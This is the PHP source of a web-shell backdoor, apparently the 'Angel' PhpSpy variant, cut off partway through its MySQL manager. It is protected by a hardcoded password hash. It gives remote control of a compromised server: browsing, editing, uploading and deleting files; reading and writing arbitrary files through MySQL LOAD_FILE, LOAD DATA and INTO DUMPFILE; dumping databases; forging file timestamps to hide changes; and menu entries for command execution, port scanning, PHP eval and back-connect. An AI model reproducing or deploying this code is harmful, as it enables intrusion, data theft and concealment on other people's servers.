<?php
error_reporting(7);
@set_magic_quotes_runtime(0);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0 );
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
@set_time_limit(0);

foreach($_POST as $key => $value) {
	if (IS_GPC) {
		$value = s_array($value);
	}
	$$key = $value;
}
/*===================== 程序配置 =====================*/

//echo encode_pass('angel');exit;
//angel = ec38fe2a8497e0a8d6d349b3533038cb
// 如果需要密码验证,请修改登陆密码,留空为不需要验证
$pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel

//如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
// cookie 前缀
$cookiepre = '';
// cookie 作用域
$cookiedomain = '';
// cookie 作用路径
$cookiepath = '/';
// cookie 有效期
$cookielife = 86400;

//程序搜索可写文件的类型
!$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
/*===================== 配置结束 =====================*/

$charsetdb = array('','armscii8','ascii','big5','binary','cp1250','cp1251','cp1256','cp1257','cp850','cp852','cp866','cp932','dec8','euc-jp','euc-kr','gb2312','gbk','geostd8','greek','hebrew','hp8','keybcs2','koi8r','koi8u','latin1','latin2','latin5','latin7','macce','macroman','sjis','swe7','tis620','ucs2','ujis','utf8');
if ($charset == 'utf8') {
	header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'big5') {
	header("content-Type: text/html; charset=big5");
} elseif ($charset == 'gbk') {
	header("content-Type: text/html; charset=gbk");
} elseif ($charset == 'latin1') {
	header("content-Type: text/html; charset=iso-8859-2");
} elseif ($charset == 'euc-kr') {
	header("content-Type: text/html; charset=euc-kr");
} elseif ($charset == 'euc-jp') {
	header("content-Type: text/html; charset=euc-jp");
}

$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();

/*===================== 身份验证 =====================*/
if ($action == "logout") {
	scookie('loginpass', '', -86400 * 365);
	@header('Location: '.$self);
	exit;
}
if($pass) {
	if ($action == 'login') {
		if ($pass == encode_pass($password)) {
			scookie('loginpass',encode_pass($password));
			@header('Location: '.$self);
			exit;
		}
	}
	if ($_COOKIE['loginpass']) {
		if ($_COOKIE['loginpass'] != $pass) {
			loginpage();
		}
	} else {
		loginpage();
	}
}
/*===================== 验证结束 =====================*/

$errmsg = '';
!$action && $action = 'file';

// 查看PHPINFO
if ($action == 'phpinfo') {
	if (IS_PHPINFO) {
		phpinfo();
		exit;
	} else {
		$errmsg = 'phpinfo() function has non-permissible';
	}
}

// 下载文件
if ($doing == 'downfile' && $thefile) {
	if (!@file_exists($thefile)) {
		$errmsg = 'The file you want Downloadable was nonexistent';
	} else {
		$fileinfo = pathinfo($thefile);
		header('Content-type: application/x-'.$fileinfo['extension']);
		header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
		header('Content-Length: '.filesize($thefile));
		@readfile($thefile);
		exit;
	}
}

// 直接下载备份数据库
if ($doing == 'backupmysql' && !$saveasfile) {
	if (!$table) {
		$errmsg ='Please choose the table';
	} else {
		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		$filename = basename($dbname.'.sql');
		header('Content-type: application/unknown');
		header('Content-Disposition: attachment; filename='.$filename);
		foreach($table as $k => $v) {
			if ($v) {
				sqldumptable($v);
			}
		}
		mysql_close();
		exit;
	}
}

// 通过MYSQL下载文件
if($doing=='mysqldown'){
	if (!$dbname) {
		$errmsg = 'Please input dbname';
	} else {
		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		if (!file_exists($mysqldlfile)) {
			$errmsg = 'The file you want Downloadable was nonexistent';
		} else {
			$result = q("select load_file('$mysqldlfile');");
			if(!$result){
				q("DROP TABLE IF EXISTS tmp_angel;");
				q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
				//用时间戳来表示截断,避免出现读取自身或包含__angel_1111111111_eof__的文件时不完整的情况
				q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
				$result = q("select content from tmp_angel");
				q("DROP TABLE tmp_angel");
			}
			$row = @mysql_fetch_array($result);
			if (!$row) {
				$errmsg = 'Load file failed '.mysql_error();
			} else {
				$fileinfo = pathinfo($mysqldlfile);
				header('Content-type: application/x-'.$fileinfo['extension']);
				header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
				header("Accept-Length: ".strlen($row[0]));
				echo $row[0];
				exit;
			}
		}
	}
}

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
.infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.drives{padding:5px;}
.drives span {margin:auto 7px;}
</style>
<script type="text/javascript">
function CheckAll(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function $(id) {
	return document.getElementById(id);
}
function createdir(){
	var newdirname;
	newdirname = prompt('Please input the directory name:', '');
	if (!newdirname) return;
	$('createdir').newdirname.value=newdirname;
	$('createdir').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
	if (!newperm) return;
	$('fileperm').newperm.value=newperm;
	$('fileperm').pfile.value=pfile;
	$('fileperm').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
	if (!tofile) return;
	$('copyfile').tofile.value=tofile;
	$('copyfile').sname.value=sname;
	$('copyfile').submit();
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
	if (!newfilename) return;
	$('rename').newfilename.value=newfilename;
	$('rename').oldname.value=oldname;
	$('rename').submit();
}
function dofile(doing,thefile,m){
	if (m && !confirm(m)) {
		return;
	}
	$('filelist').doing.value=doing;
	if (thefile){
		$('filelist').thefile.value=thefile;
	}
	$('filelist').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt('Please input the file name:', '');
	if (!filename) return;
	opfile('editfile',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
	$('fileopform').action.value=action;
	$('fileopform').opfile.value=opfile;
	$('fileopform').dir.value=dir;
	$('fileopform').submit();
}
function godir(dir,view_writable){
	if (view_writable) {
		$('godir').view_writable.value=view_writable;
	}
	$('godir').dir.value=dir;
	$('godir').submit();
}
function getsize(getdir,dir){
	$('getsize').getdir.value=getdir;
	$('getsize').dir.value=dir;
	$('getsize').submit();
}
function editrecord(action, base64, tablename){
	if (action == 'del') {		
		if (!confirm('Is or isn\'t deletion record?')) return;
	}
	$('recordlist').doing.value=action;
	$('recordlist').base64.value=base64;
	$('recordlist').tablename.value=tablename;
	$('recordlist').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
	$('setdbname').dbname.value=dbname;
	$('setdbname').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if (doing) {
		$('settable').doing.value=doing;
	}
	if (page) {
		$('settable').page.value=page;
	}
	$('settable').tablename.value=tablename;
	$('settable').submit();
}
function s(action,nowpath,p1,p2,p3,p4,p5) {
	if(action) $('opform').action.value=action;
	if(nowpath) $('opform').nowpath.value=nowpath;
	if(p1) $('opform').p1.value=p1;
	if(p2) $('opform').p2.value=p2;
	if(p3) $('opform').p3.value=p3;
	if(p4) $('opform').p4.value=p4;
	if(p5) $('opform').p4.value=p5;
}
function g(action,nowpath,p1,p2,p3,p4,p5) {
	if(!action) return;
	s(action,nowpath,p1,p2,p3,p4,p5);
	$('opform').submit();
}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all">
<?php
formhead(array('name'=>'opform'));
makehide('action', $action);
makehide('nowpath', $nowpath);
makehide('p1', $p1);
makehide('p2', $p2);
makehide('p3', $p3);
makehide('p4', $p4);
makehide('p5', $p5);
formfoot();

if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(@posix_geteuid());
	$gid = @posix_getgrgid(@posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;"><?php echo @php_uname();?> / User:<?php echo $uid.' ( '.$user.' ) / Group: '.$gid.' ( '.$group.' )';?></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>
	</tr>
	<tr class="alt1">
		<td>
			<span style="float:right;">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>
			<a href="javascript:g('logout');">Logout</a> | 
			<a href="javascript:g('file');">File Manager</a> | 
			<a href="javascript:g('mysqladmin');">MYSQL Manager</a> | 
			<a href="javascript:g('sqlfile');">MySQL Upload &amp; Download</a> | 
			<a href="javascript:g('shell');">Execute Command</a> | 
			<a href="javascript:g('phpenv');">PHP Variable</a> | 
			<a href="javascript:g('portscan');">Port Scan</a> | 
			<a href="javascript:g('secinfo');">Security information</a> | 
			<a href="javascript:g('eval');">Eval PHP Code</a>
			<?php if (!IS_WIN) {?> | <a href="javascript:g('backconnect');">Back Connect</a><?php }?>
		</td>
	</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php
$errmsg && m($errmsg);

// 获取当前路径
if (!$dir) {
	$dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
}
$nowpath = getPath(SA_ROOT, $dir);
if (substr($dir, -1) != '/') {
	$dir = $dir.'/';
}

if ($action == 'file') {

	// 判断读写情况
	$dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';

	// 创建目录
	if ($newdirname) {
		$mkdirs = $nowpath.$newdirname;
		if (file_exists($mkdirs)) {
			m('Directory has already existed');
		} else {
			m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));
			@chmod($mkdirs,0777);
		}
	}

	// 上传文件
	elseif ($doupfile) {
		m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
	}

	// 编辑文件
	elseif ($editfilename && $filecontent) {
		$fp = @fopen($editfilename,'w');
		m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
		@fclose($fp);
	}

	// 编辑文件属性
	elseif ($pfile && $newperm) {
		if (!file_exists($pfile)) {
			m('The original file does not exist');
		} else {
			$newperm = base_convert($newperm,8,10);
			m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));
		}
	}

	// 改名
	elseif ($oldname && $newfilename) {
		$nname = $nowpath.$newfilename;
		if (file_exists($nname) || !file_exists($oldname)) {
			m($nname.' has already existed or original file does not exist');
		} else {
			m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
		}
	}

	// 复制文件
	elseif ($sname && $tofile) {
		if (file_exists($tofile) || !file_exists($sname)) {
			m('The goal file has already existed or original file does not exist');
		} else {
			m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));
		}
	}

	// 克隆时间
	elseif ($curfile && $tarfile) {
		if (!@file_exists($curfile) || !@file_exists($tarfile)) {
			m('The goal file has already existed or original file does not exist');
		} else {
			$time = @filemtime($tarfile);
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
		}
	}

	// 自定义时间
	elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
		if (!@file_exists($curfile)) {
			m(basename($curfile).' does not exist');
		} else {
			$time = strtotime("$year-$month-$day $hour:$minute:$second");
			m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
		}
	}

	// 批量删除文件
	elseif($doing == 'delfiles') {
		if ($dl) {
			$dfiles='';
			$succ = $fail = 0;
			foreach ($dl as $filepath) {
				if (is_dir($filepath)) {
					if (@deltree($filepath)) {
						$succ++;
					} else {
						$fail++;
					}
				} else {
					if (@unlink($filepath)) {
						$succ++;
					} else {
						$fail++;
					}
				}
			}
			m('Deleted folder/file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);
		} else {
			m('Please select folder/file(s)');
		}
	}

	//操作完毕
	formhead(array('name'=>'createdir'));
	makehide('newdirname');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'fileperm'));
	makehide('newperm');
	makehide('pfile');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'copyfile'));
	makehide('sname');
	makehide('tofile');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'rename'));
	makehide('oldname');
	makehide('newfilename');
	makehide('dir',$nowpath);
	formfoot();
	formhead(array('name'=>'fileopform', 'target'=>'_blank'));
	makehide('action');
	makehide('opfile');
	makehide('dir');
	formfoot();
	formhead(array('name'=>'getsize'));
	makehide('getdir');
	makehide('dir');
	formfoot();

	$free = @disk_free_space($nowpath);
	!$free && $free = 0;
	$all = @disk_total_space($nowpath);
	!$all && $all = 0;
	$used = $all-$free;
	p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.@round(100/($all/$free),2).'%)</h2>');

	$cwd_links = '';
	$path = explode('/', $nowpath);
	$n=count($path);
	for($i=0;$i<$n-1;$i++) {
		$cwd_links .= '<a href="javascript:godir(\'';
		for($j=0;$j<=$i;$j++) {
			$cwd_links .= $path[$j].'/';
		}
		$cwd_links .= '\');">'.$path[$i].'/</a>';
	}

?>
<script type="text/javascript">
document.onclick = shownav;
function shownav(e){
	var src = e?e.target:event.srcElement;
	do{
		if(src.id =="jumpto") {
			$('inputnav').style.display = "";
			$('pathnav').style.display = "none";
			//hidenav();
			return;
		}
		if(src.id =="inputnav") {
			return;
		}
		src = src.parentNode;
	}while(src.parentNode)

	$('inputnav').style.display = "none";
	$('pathnav').style.display = "";
}
</script>
<div style="background:#eee;margin-bottom:10px;">
	<table id="pathnav" width="100%" border="0" cellpadding="5" cellspacing="0">
		<tr>
			<td width="100%"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir_writeable;?>)</td>
			<td nowrap><input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button"></td>
		</tr>
	</table>
	<table id="inputnav" width="100%" border="0" cellpadding="5" cellspacing="0" style="display:none;">
	<form action="" method="post" id="godir" name="godir">
		<tr>
			<td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
			<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:99%;margin:0 8px;"></td>
			<td nowrap><input class="bt" value="GO" type="submit"></td>
		</tr>
	</form>
	</table>
<?php
	if (IS_WIN && IS_COM) {
		$obj = new COM('scripting.filesystemobject');
		if ($obj && is_object($obj) && $obj->Drives) {
			echo '<div class="drives">';
			$DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
			$comma = '';
			foreach($obj->Drives as $drive) {
				if ($drive->Path) {
					p($comma.'<a href="javascript:godir(\''.$drive->Path.'/\');">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
					$comma = '<span>|</span>';
				}
			}
			echo '</div>';
		}
	}
?>
</div>
<?php
	$findstr = $_POST['findstr'];
	$re = $_POST['re'];
	tbhead();
	p('<tr class="alt1"><td colspan="7" style="padding:5px;line-height:20px;">');
	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$nowpath.'" type="hidden" /><input name="dir" value="'.$nowpath.'" type="hidden" /></div></form>');
	p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">WebRoot</a>');
	p(' | <a href="javascript:godir(\'.\');">ScriptPath</a>');
	p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
	p(' | View Writable ( <a href="javascript:godir(\''.$nowpath.'\',\'dir\');">Directory</a>');
	p(' | <a href="javascript:godir(\''.$nowpath.'\',\'file\');">File</a> )');
	p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Create File</a>');

	p('<div style="padding:5px 0;"><form action="'.$self.'" method="POST">Find string in files(current folder): <input class="input" name="findstr" value="'.$findstr.'" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input class="input" name="writabledb" value="'.$writabledb.'" type="text" /><input name="dir" value="'.$dir.'" type="hidden" /> <input name="re" value="1" type="checkbox" '.($re ? 'checked' : '').' /> Regular expressions</form></div></td></tr>');

	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');

	//查看所有可写文件和目录
	$dirdata=array();
	$filedata=array();

	if ($view_writable == 'dir') {
		$dirdata = GetWDirList($nowpath);
		$filedata = array();
	} elseif ($view_writable == 'file') {
		$dirdata = array();
		$filedata = GetWFileList($nowpath);
	} elseif ($findstr) {
		$dirdata = array();
		$filedata = GetSFileList($nowpath, $findstr, $re);
	} else {
		// 目录列表
		//scandir()效率更高
		$dirs=@opendir($dir);
		while ($file=@readdir($dirs)) {
			$filepath=$nowpath.$file;
			if(@is_dir($filepath)){
				$dirdb['filename']=$file;
				$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$dirdb['dirchmod']=getChmod($filepath);
				$dirdb['dirperm']=getPerms($filepath);
				$dirdb['fileowner']=getUser($filepath);
				$dirdb['dirlink']=$nowpath;
				$dirdb['server_link']=$filepath;
				$dirdata[]=$dirdb;
			} else {		
				$filedb['filename']=$file;
				$filedb['size']=sizecount(@filesize($filepath));
				$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
				$filedb['filechmod']=getChmod($filepath);
				$filedb['fileperm']=getPerms($filepath);
				$filedb['fileowner']=getUser($filepath);
				$filedb['dirlink']=$nowpath;
				$filedb['server_link']=$filepath;
				$filedata[]=$filedb;
			}
		}// while
		unset($dirdb);
		unset($filedb);
		@closedir($dirs);
	}
	@sort($dirdata);
	@sort($filedata);
	$dir_i = '0';

	p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
	makehide('action','file');
	makehide('thefile');
	makehide('doing');
	makehide('dir',$nowpath);

	foreach($dirdata as $key => $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			if($getdir && $getdir == $dirdb['server_link']) {
				$attachsize = dirsize($dirdb['server_link']);
				$attachsize = is_numeric($attachsize) ? sizecount($attachsize) : 'Unknown';
			} else {
				$attachsize = '<a href="javascript:getsize(\''.$dirdb['server_link'].'\',\''.$dir.'\');">Stat</a>';
			}
			$thisbg = bg();
			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
			p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$dirdb['server_link'].'"></td>');
			p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
			p('<td nowrap><a href="javascript:opfile(\'newtime\',\''.$dirdb['server_link'].'\',\''.$dirdb['dirlink'].'\');">'.$dirdb['mtime'].'</a></td>');
			p('<td nowrap>'.$attachsize.'</td>');
			p('<td nowrap>');
			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].'</a> / ');
			p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');
			p('<td nowrap><a href="javascript:rename(\''.$dirdb['server_link'].'\');">Rename</a></td>');
			p('</tr>');
			$dir_i++;
		} else {
			if($dirdb['filename']=='..') {
				p('<tr class='.bg().'>');
				p('<td align="center">-</td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
				p('</tr>');
			}
		}
	}

	p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>');
	$file_i = '0';

	foreach($filedata as $key => $filedb){
		if($filedb['filename']!='..' && $filedb['filename']!='.') {
			$fileurl = str_replace($_SERVER["DOCUMENT_ROOT"],'',$filedb['server_link']);
			$thisbg = bg();
			p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
			p('<td width="2%" nowrap><input name="dl[]" type="checkbox" value="'.$filedb['server_link'].'"></td>');
			p('<td>'.((strpos($filedb['server_link'], $_SERVER["DOCUMENT_ROOT"]) !== false) ? '<a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a>' : $filedb['filename']).'</td>');
			p('<td nowrap><a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">'.$filedb['mtime'].'</a></td>');
			p('<td nowrap>'.$filedb['size'].'</td>');
			p('<td nowrap>');
			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].'</a> / ');
			p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');
			p('<td nowrap>');
			p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Down</a> | ');
			p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');
			p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Edit</a> | ');
			p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Rename</a>');
			p('</td></tr>');
			$file_i++;
		}
	}
	p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td colspan="4"><a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
	p('</form></table>');
}// end dir

elseif ($action == 'sqlfile') {
	if($doing=="mysqlupload"){
		$file = $_FILES['uploadfile'];
		$filename = $file['tmp_name'];
		if (file_exists($savepath)) {
			m('The goal file has already existed');
		} else {
			if(!$filename) {
				m('Please choose a file');
			} else {
				$fp=@fopen($filename,'r');
				$contents=@fread($fp, filesize($filename));
				@fclose($fp);
				$contents = bin2hex($contents);
				if(!$upname) $upname = $file['name'];
				$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
				$result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
				m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
			}
		}
	}
?>
<script type="text/javascript">
function mysqlfile(doing){
	if(!doing) return;
	$('doing').value=doing;
	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;
	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;
	$('mysqlfile').charset.value=$('dbinfo').charset.value;
	$('mysqlfile').submit();
}
</script>
<?php
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));
	makehide('action','sqlfile');
	p('<p>');
	p('DBHost:');
	makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
	p(':');
	makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
	p('DBUser:');
	makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
	p('DBPass:');
	makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
	p('DBName:');
	makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));
	p('DBCharset:');
	makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
	p('</p>');
	formfoot();
	p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');
	p('<h2>Upload file</h2>');
	p('<p><b>This operation the DB user must has FILE privilege</b></p>');
	p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
	p('<h2>Download file</h2>');
	p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
	makehide('dbhost');
	makehide('dbport');
	makehide('dbuser');
	makehide('dbpass');
	makehide('dbname');
	makehide('charset');
	makehide('doing');
	makehide('action','sqlfile');
	p('</form>');
}

elseif ($action == 'mysqladmin') {
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	$dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
	if(isset($dbhost)){
		$dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
	}
	if(isset($dbuser)) {
		$dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
	}
	if(isset($dbpass)) {
		$dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
	}
	if(isset($dbport)) {
		$dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
	}
	if(isset($dbname)) {
		$dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
	}
	if(isset($charset)) {
		$dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
	}

	if ($doing == 'backupmysql' && $saveasfile) {
		if (!$table) {
			m('Please choose the table');
		} else {
			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			$fp = @fopen($path,'w');
			if ($fp) {
				foreach($table as $k => $v) {
					if ($v) {
						sqldumptable($v, $fp);
					}
				}
				fclose($fp);				
				$fileurl = str_replace(SA_ROOT,'',$path);
				m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
				mysql_close();
			} else {
				m('Backup failed');
			}
		}
	}
	if ($insert && $insertsql) {
		$keystr = $valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			if ($val) {
				$keystr .= $tmp.$key;
				$valstr .= $tmp."'".addslashes($val)."'";
				$tmp = ',';
			}
		}
		if ($keystr && $valstr) {
			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
		}
	}
	if ($update && $insertsql && $base64) {
		$valstr = $tmp = '';
		foreach($insertsql as $key => $val) {
			$valstr .= $tmp.$key."='".addslashes($val)."'";
			$tmp = ',';
		}
		if ($valstr) {
			$where = base64_decode($base64);
			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
		}
	}
	if ($doing == 'del' && $base64) {
		$where = base64_decode($base64);
		$delete_sql = "DELETE FROM $tablename WHERE $where";
		$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
	}

	if ($tablename && $doing == 'drop') {
